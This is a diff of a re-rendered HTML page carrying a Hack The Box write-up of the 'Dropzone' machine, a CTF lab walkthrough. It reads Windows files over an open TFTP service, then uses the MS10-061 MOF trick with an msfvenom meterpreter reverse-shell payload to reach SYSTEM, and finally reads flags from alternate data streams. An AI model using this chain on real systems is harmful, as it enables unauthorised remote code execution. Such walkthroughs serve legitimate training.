@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-US">
   <head>
-    <meta name="generator" content="Hugo 0.56.3" />
+    <meta name="generator" content="Hugo 0.64.1" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hack The Box Write-up - Dropzone | text/plain</title>
@@ -38,8 +38,7 @@ folder. The last step to get both flags is to read the ADS of the hidden file,
 which only works after uploading the streams.exe tools from Sysinternals." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://dominicbreuker.com/post/htb_dropzone/" />
-
-<meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322" />
+<meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322"/>
 <meta property="article:published_time" content="2018-11-03T00:00:00+01:00" />
 <meta property="article:modified_time" content="2018-11-03T00:00:00+01:00" />
 
@@ -247,16 +246,14 @@ explore the system. Remembering the old Stuxnet exploits, you can find a way in
 by exploiting Windows WMI with a malicious MOF file uploaded to a special
 folder. The last step to get both flags is to read the ADS of the hidden file,
 which only works after uploading the streams.exe tools from Sysinternals.">
-
-
 <meta itemprop="datePublished" content="2018-11-03T00:00:00&#43;01:00" />
 <meta itemprop="dateModified" content="2018-11-03T00:00:00&#43;01:00" />
 <meta itemprop="wordCount" content="2025">
+<meta itemprop="image" content="https://source.unsplash.com/category/technology/2000x1322"/>
 
 
 
 <meta itemprop="keywords" content="ctf,infosec,hackthebox,write-up," />
-
     <script async src="/js/baffle.js"></script>
     <header>
       <h1 class="baffle" itemprop="headline">Hack The Box Write-up - Dropzone</h1>
@@ -291,20 +288,15 @@ which only works after uploading the streams.exe tools from Sysinternals.</block
   <details>
     <summary>Table of Contents</summary>
     <nav id="TableOfContents">
-<ul>
-<li><a href="#enumeration">Enumeration</a>
-<ul>
-<li><a href="#port-scan">Port scan</a></li>
-<li><a href="#tftp-enumeration">TFTP enumeration</a></li>
-</ul></li>
-<li><a href="#exploiting-tftp">Exploiting TFTP</a>
-<ul>
-<li><a href="#ms10-046-and-lnk-files-won-t-work">MS10-046 and LNK files - won&rsquo;t work</a></li>
-<li><a href="#ms10-061-and-mof-files-will-work">MS10-061 and MOF files - will work</a></li>
-</ul></li>
-<li><a href="#getting-the-flag-from-ads">Getting the flag from ADS</a></li>
-<li><a href="#references">References</a></li>
-</ul>
+  <ul>
+    <li><a href="#port-scan">Port scan</a></li>
+    <li><a href="#tftp-enumeration">TFTP enumeration</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#ms10-046-and-lnk-files---wont-work">MS10-046 and LNK files - won&rsquo;t work</a></li>
+    <li><a href="#ms10-061-and-mof-files---will-work">MS10-061 and MOF files - will work</a></li>
+  </ul>
 </nav>
   </details>
   <script>
@@ -324,43 +316,33 @@ which only works after uploading the streams.exe tools from Sysinternals.</block
 
 
     <div itemprop="articleBody">
-      
-
-<h1 id="enumeration">Enumeration</h1>
-
+      <h1 id="enumeration">Enumeration</h1>
 <h2 id="port-scan">Port scan</h2>
-
 <p>As usual, start with a quick port scan to identify open ports for inspection:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ masscan -e tun0 -p <span style="color: #ae81ff">1</span>-65535 --rate <span style="color: #ae81ff">2000</span> <span style="color: #ae81ff">10</span>.10.10.90
+<pre><code class="language-console" data-lang="console"> $ masscan -e tun0 -p 1-65535 --rate 2000 10.10.10.90
 
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-10-08 20:55:02 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
 Initiating SYN Stealth Scan
 Scanning 1 hosts [65535 ports/host]
-</code></pre></div>
-
-<p>Not a single open port was identified. Instead of debugging
+</code></pre><p>Not a single open port was identified. Instead of debugging
 <a href="https://github.com/robertdavidgraham/masscan">masscan</a>, checking the VPN
 connection, trying out all sorts of firewall evasion techniques, or going crazy
 otherwise, remember port scans do TCP by default but can do UDP as well:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>$ masscan -e tun0 -p U:1-65535 --rate <span style="color: #ae81ff">2000</span> <span style="color: #ae81ff">10</span>.10.10.90
+<pre><code class="language-console" data-lang="console">$ masscan -e tun0 -p U:1-65535 --rate 2000 10.10.10.90
 ...
 Discovered open port 69/udp on 10.10.10.90
-</code></pre></div>
-
-<p>Now there is an open port, suggesting a
+</code></pre><p>Now there is an open port, suggesting a
 <a href="https://en.wikipedia.org/wiki/Trivial_File_Transfer_Protocol">TFTP</a> service at
 UDP 69. With nmap we can find out more:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ nmap -sV -sC -sU -p <span style="color: #ae81ff">69</span> <span style="color: #ae81ff">10</span>.10.10.90
+<pre><code class="language-console" data-lang="console"> $ nmap -sV -sC -sU -p 69 10.10.10.90
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-14 17:00 EDT
 Nmap scan report for 10.10.10.90
 Host is up (0.046s latency).
 
 PORT   STATE SERVICE VERSION
 69/udp open  tftp    SolarWinds Free tftpd
-</code></pre></div>
-
-<p>Nmap confirms there is TFTP running and identifies it as the <a href="https://www.solarwinds.com/">SolawWinds TFTP
+</code></pre><p>Nmap confirms there is TFTP running and identifies it as the <a href="https://www.solarwinds.com/">SolawWinds TFTP
 server</a>. A little bit of background: TFTP is a
 very minimalistic (&ldquo;trivial&rdquo;) file transfer protocol. It only supports uploading
 and downloading files. Listing directories, deleting files, authenticating
@@ -373,59 +355,47 @@ though. Indeed, the
 of <a href="https://www.fusionpbx.com/">FusionPBX</a> suggests TFTP is still required for
 lots of phone hardware, so chances are that you may actually encounter such a
 service in reality even today.</p>
-
 <p>That was just me asking myself why anybody would use TFTP. Going forward, we
 can expect to be able to read and possibly write files on the box. Let&rsquo;s see
 what we can do.</p>
-
 <h2 id="tftp-enumeration">TFTP enumeration</h2>
-
 <p>There are numerous blog posts about Windows LFI that may give you an idea what
 to look for (e.g.,
 <a href="https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/">here</a>).
 We connect with <code>tftp</code> and start with the basics. After connecting, you can use
 the <code>get</code> command to receive files. TFTP will let you know if the files exist:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ tftp <span style="color: #ae81ff">10</span>.10.10.90
+<pre><code class="language-console" data-lang="console"> $ tftp 10.10.10.90
 tftp&gt; get non-existing-file
-Error code 1: Could not find file &#39;C:\non-existing-file&#39;.
+Error code 1: Could not find file 'C:\non-existing-file'.
 
 tftp&gt; get WINDOWS\System32\drivers\etc\hosts
 Received 734 bytes in 0.1 seconds [58720 bits/sec]
-</code></pre></div>
-
-<p>After getting a file, you will find it in your current directory. So let&rsquo;s read
+</code></pre><p>After getting a file, you will find it in your current directory. So let&rsquo;s read
 some interesting files. With <code>get /boot.ini</code>, we find out that the box runs
 Windows XP:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ cat boot.ini
+<pre><code class="language-console" data-lang="console"> $ cat boot.ini
 [boot loader]
 timeout=30
 default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
 [operating systems]
 multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&quot;Microsoft Windows XP Professional&quot; /noexecute=optin /fastdetect
-</code></pre></div>
-
-<p>Using <code>get /Windows/System32/eula.txt</code> we can further see it is Windows XP
+</code></pre><p>Using <code>get /Windows/System32/eula.txt</code> we can further see it is Windows XP
 Professional Service Pack 3:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ head -n <span style="color: #ae81ff">6</span> eula.txt
+<pre><code class="language-console" data-lang="console"> $ head -n 6 eula.txt
 END-USER LICENSE AGREEMENT FOR MICROSOFT
 SOFTWARE
 
 MICROSOFT WINDOWS XP PROFESSIONAL EDITION
 SERVICE PACK 3
-</code></pre></div>
-
-<p>After that, I spent some time poking around the system to find sensitive files
-or hints about other services that may run. For instance, you can also <code>get
-windows\repair\SAM</code> and probably could extract some password hashes. But that
+</code></pre><p>After that, I spent some time poking around the system to find sensitive files
+or hints about other services that may run. For instance, you can also <code>get windows\repair\SAM</code> and probably could extract some password hashes. But that
 is all useless as all you can do is connect to the TFTP server.</p>
-
 <h1 id="exploiting-tftp">Exploiting TFTP</h1>
-
 <p>One way to get into the box could have been to exploit the TFTP service.
 Check <code>searchsploit</code> and it returns a long list of DOS attacks and a directory
 traversals. Not much useful information here, since we know already that we can
 read pretty much everything.</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ searchsploit solarwinds
+<pre><code class="language-console" data-lang="console"> $ searchsploit solarwinds
 ----------------------------------------------------------------------- ----------------------------------------
  Exploit Title                                                         |  Path
                                                                        | (/usr/share/exploitdb/)
@@ -437,21 +407,15 @@ SolarWinds TFTP Server 9.2.0.111 - Remote Denial of Service            | exploit
 SolarWinds TFTP Server Standard Edition 5.0.55 - Directory Traversal   | exploits/windows/remote/21964.txt
 SolarWinds TFTP Server Standard Edition 5.0.55 - Large UDP Packet      | exploits/windows/dos/21963.pl
 ...
-</code></pre></div>
-
-<p>What is interesting though is that we seem to be able to write files on the remote
+</code></pre><p>What is interesting though is that we seem to be able to write files on the remote
 system to any location, e.g., into the &ldquo;system32&rdquo; folder, which should be
 protected:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>tftp&gt; put eula.txt /Windows/system32/eula.txt
+<pre><code class="language-console" data-lang="console">tftp&gt; put eula.txt /Windows/system32/eula.txt
 Sent 41543 bytes in 5.0 seconds
-</code></pre></div>
-
-<p>This observation either gives you the right idea, or you spend some quality time with
+</code></pre><p>This observation either gives you the right idea, or you spend some quality time with
 Google until you discover how the ability to write files on Windows XP can help
 you. Below a summary of my journey:</p>
-
-<h2 id="ms10-046-and-lnk-files-won-t-work">MS10-046 and LNK files - won&rsquo;t work</h2>
-
+<h2 id="ms10-046-and-lnk-files---wont-work">MS10-046 and LNK files - won&rsquo;t work</h2>
 <p>The main question to start with is what can be done to Windows computers with
 arbitrary writes to any locations. If you remember how the
 <a href="https://en.wikipedia.org/wiki/Stuxnet">Stuxnet</a> worm was able to infect so
@@ -465,7 +429,6 @@ newer versions are
 and
 <a href="https://www.rapid7.com/db/modules/exploit/windows/fileformat/cve_2017_8464_lnk_rce">CVE-2017-8464</a>,
 all available in Metasploit for your convenience.</p>
-
 <p>As an example, let&rsquo;s have a closer look at the first of these vulnerabilities,
 as described <a href="http://www.geoffchappell.com/notes/security/stuxnet/ctrlfldr.htm">here</a>.
 Basically, the trick is to create an LNK file pointing to a CPL file. CPL files
@@ -475,33 +438,27 @@ panel item is represented by a <a href="https://support.microsoft.com/en-nz/help
 file</a>
 living in the system folder. Is is possible for 3rd parties to add control
 panel items by adding files.</p>
-
 <p>To know which icon should be used to display the shortcut, the control panel
 asks the CPL file. For that to work, it seems as if the control panel loads the
 CPL to let it decide which item to use by executing code (sounds crazy, but
 that&rsquo;s what the blog posts say :D). If you craft the CPL file accordingly, you
 can execute anything.</p>
-
 <p>So I went on to generate some of these files and put them onto the box to
 different places, e.g., the Administrator&rsquo;s Desktop, hoping there would be some
 script simulating a user browsing the files. However, there is none. This
 strategy did not work.</p>
-
-<h2 id="ms10-061-and-mof-files-will-work">MS10-061 and MOF files - will work</h2>
-
+<h2 id="ms10-061-and-mof-files---will-work">MS10-061 and MOF files - will work</h2>
 <p>Once unsuccessfully littering the box with LNK files frustrated me enough,
 I took a break and just read some nice Stuxnet articles to calm
 down a bit. This actually points to the right solution eventually. To see
 how, check out this
 <a href="https://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html">article</a>
 or read my short summary:</p>
-
 <p>Another way Stuxnet got into a system was by exploiting a vulnerability in the
 Printer spooler. Many descriptions say it can be exploited to remotely execute
 code on the machine. These descriptions leave out a small but important detail
 thought. The Printer spooler does not execute code, it writes files. The
 interesting part is how Stuxnet uses that ability to execute code.</p>
-
 <p>Windows has something called <a href="https://docs.microsoft.com/en-us/windows/desktop/wmisdk/about-wmi">Windows Management
 Instrumentation</a>
 (WMI), which is a facility to manage Windows machines with scripts. You can
@@ -512,7 +469,6 @@ The relevant part for this box is that you can create a &ldquo;script&rdquo; as 
 put it into a special folder, and Windows will execute it. This is usually
 not that big of a problem as only Administrators can write to that folder. We
 can use this feature to get a shell.</p>
-
 <p>Inspecting the original Metasploit exploit <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/ms10_061_spoolss.rb">source
 code</a>,
 we can see that it includes a module <code>Msf::Exploit::WbemExec</code> to load a function
@@ -521,7 +477,6 @@ we can see that it includes a module <code>Msf::Exploit::WbemExec</code> to load
 and it basically is a template for a MOF file executing an EXE and cleaning up
 after itself. Copy that file, open it with vim, fix the formatting and replace
 the various placeholders:</p>
-
 <ul>
 <li><code>:%s/\\\\/\\/g</code> to unescape backslashes</li>
 <li><code>:%s/@EXE@/bad.exe/g</code> to tell it to execute a file &ldquo;bad.exe&rdquo;, which we will
@@ -538,30 +493,25 @@ for details how to build such files, but use the Metasploit version as the one
 from the article uses VBScript, not JScript, which seems to not work on the
 box)</li>
 </ul>
-
 <p>Now we have a &ldquo;bad.mof&rdquo; file and are ready to go. The rest is easy. Build a
 payload:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ msfvenom -p windows/meterpreter/reverse_tcp <span style="color: #f8f8f2">LHOST</span><span style="color: #f92672">=</span><span style="color: #ae81ff">10</span>.10.15.147 <span style="color: #f8f8f2">LPORT</span><span style="color: #f92672">=</span><span style="color: #ae81ff">443</span> -f exe -o bad.exe
+<pre><code class="language-console" data-lang="console"> $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.147 LPORT=443 -f exe -o bad.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder or badchars specified, outputting raw payload
 Payload size: 341 bytes
 Final size of exe file: 73802 bytes
 Saved as: bad.exe
-</code></pre></div>
-
-<p>Then upload the payload first, followed by the MOF file:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ tftp <span style="color: #ae81ff">10</span>.10.10.90
+</code></pre><p>Then upload the payload first, followed by the MOF file:</p>
+<pre><code class="language-console" data-lang="console"> $ tftp 10.10.10.90
 tftp&gt; binary
 tftp&gt; put bad.exe /WINDOWS/system32/bad.exe
 Sent 73802 bytes in 8.7 seconds
 tftp&gt; put bad.mof /WINDOWS/system32/wbem/mof/bad.mof
 Sent 707 bytes in 0.2 seconds
-</code></pre></div>
-
-<p>Finally, catch a meterpreter session and be system (start this handler before
+</code></pre><p>Finally, catch a meterpreter session and be system (start this handler before
 uploading &ldquo;bad.mof&rdquo;!):</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>msf &gt; use exploit/multi/handler
+<pre><code class="language-console" data-lang="console">msf &gt; use exploit/multi/handler
 msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
 payload =&gt; windows/meterpreter/reverse_tcp
 msf exploit(multi/handler) &gt; set LHOST 10.10.15.147
@@ -576,47 +526,34 @@ msf exploit(multi/handler) &gt; run
 
 meterpreter &gt; getuid
 Server username: NT AUTHORITY\SYSTEM
-</code></pre></div>
-
-<p>If things don&rsquo;t work as expected, check the MOF compilation logs for errors.
+</code></pre><p>If things don&rsquo;t work as expected, check the MOF compilation logs for errors.
 You can get them with TFTP like so:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>tftp&gt; get /WINDOWS/system32/wbem/Logs/mofcomp.log
+<pre><code class="language-console" data-lang="console">tftp&gt; get /WINDOWS/system32/wbem/Logs/mofcomp.log
 Received 15235 bytes in 1.8 seconds
-</code></pre></div>
-
-<p>A working MOF file should produce this two entries:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>(Sun Oct 14 22:46:26 2018.114724390) : Parsing MOF file: C:\WINDOWS\system32\wbem\mof\bad.mof
+</code></pre><p>A working MOF file should produce this two entries:</p>
+<pre><code class="language-console" data-lang="console">(Sun Oct 14 22:46:26 2018.114724390) : Parsing MOF file: C:\WINDOWS\system32\wbem\mof\bad.mof
 (Sun Oct 14 23:17:35 2018.116593562) : Finished compiling file:C:\WINDOWS\system32\wbem\mof\bad.mof
-</code></pre></div>
-
-<p>Any mistake in the MOF file causes the logs to look like below. For instance,
+</code></pre><p>Any mistake in the MOF file causes the logs to look like below. For instance,
 this happens if you use the VBScript-based MOF file described in the article
 above.</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>(Sun Oct 14 22:46:26 2018.114724390) : Parsing MOF file: C:\WINDOWS\system32\wbem\mof\bad.mof
+<pre><code class="language-console" data-lang="console">(Sun Oct 14 22:46:26 2018.114724390) : Parsing MOF file: C:\WINDOWS\system32\wbem\mof\bad.mof
 (Sun Oct 14 22:46:26 2018.114724406) : An error occurred while processing item 4 defined on lines 22 - 26 in file C:\WINDOWS\system32\wbem\mof\bad.mof:
 (Sun Oct 14 22:46:26 2018.114724406) : Error Number: 0x80010117, Facility: RPC
 Description: Call context cannot be accessed after call completed.
-</code></pre></div>
-
-<h1 id="getting-the-flag-from-ads">Getting the flag from ADS</h1>
-
+</code></pre><h1 id="getting-the-flag-from-ads">Getting the flag from ADS</h1>
 <p>Even though you are system already, the is one tiny little step left to get the
 flag. If you try to read it in a shell session, you get this:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>C:\Documents and Settings\Administrator\Desktop&gt;type root.txt
+<pre><code class="language-console" data-lang="console">C:\Documents and Settings\Administrator\Desktop&gt;type root.txt
 type root.txt
-It&#39;s easy, but not THAT easy...
-</code></pre></div>
-
-<p>Obviously, the flag cannot be here since TFTP would have been enough to just
+It's easy, but not THAT easy...
+</code></pre><p>Obviously, the flag cannot be here since TFTP would have been enough to just
 get it. But there is a &ldquo;flags&rdquo; directory, in which you see an interesting file:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>C:\Documents and Settings\Administrator\Desktop\flags&gt;type &quot;2 for the price of 1!.txt&quot;
+<pre><code class="language-console" data-lang="console">C:\Documents and Settings\Administrator\Desktop\flags&gt;type &quot;2 for the price of 1!.txt&quot;
 type &quot;2 for the price of 1!.txt&quot;
 For limited time only!
 
 Keep an eye on our ADS for new offers &amp; discounts!
-</code></pre></div>
-
-<p>ADS refers to <a href="https://docs.microsoft.com/en-us/windows/desktop/fileio/file-streams">Alternative Data
+</code></pre><p>ADS refers to <a href="https://docs.microsoft.com/en-us/windows/desktop/fileio/file-streams">Alternative Data
 Streams</a>,
 a feature of NTFS that is sometimes abused to hide data (see this
 <a href="https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/">article</a>).
@@ -627,7 +564,7 @@ it to the box with meterpreter (or download with
 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil">certutil</a>
 if you chose a plain CMD session as payload). Now you can read the stream
 names, which are the flags:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>C:\Documents and Settings\Administrator\Desktop\flags&gt;streams -accepteula -s .
+<pre><code class="language-console" data-lang="console">C:\Documents and Settings\Administrator\Desktop\flags&gt;streams -accepteula -s .
 streams -accepteula -s .
 
 streams v1.60 - Reveal NTFS alternate streams.
@@ -637,17 +574,12 @@ Sysinternals - www.sysinternals.com
 C:\Documents and Settings\Administrator\Desktop\flags\2 for the price of 1!.txt:
    :root_txt_&lt;root-flag-here&gt;:$DATA     5
    :user_txt_&lt;user-flag-here&gt;:$DATA     5
-</code></pre></div>
-
-<p>Just for completeness, here is how you could read the stream data if the flags
+</code></pre><p>Just for completeness, here is how you could read the stream data if the flags
 had been stored inside:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>C:\Documents and Settings\Administrator\Desktop\flags&gt;more &lt; &quot;2 for the price of 1!.txt:root_txt_&lt;root-flag-here&gt;&quot;
+<pre><code class="language-console" data-lang="console">C:\Documents and Settings\Administrator\Desktop\flags&gt;more &lt; &quot;2 for the price of 1!.txt:root_txt_&lt;root-flag-here&gt;&quot;
 more &lt; &quot;2 for the price of 1!.txt:root_txt_&lt;root-flag-here&gt;&quot;
 &quot;&quot;
-</code></pre></div>
-
-<h1 id="references">References</h1>
-
+</code></pre><h1 id="references">References</h1>
 <ul>
 <li>Interesting blog posts that explain in great detail how MOF files are
 written, what WMI is and how they fit in to the bigger picture are
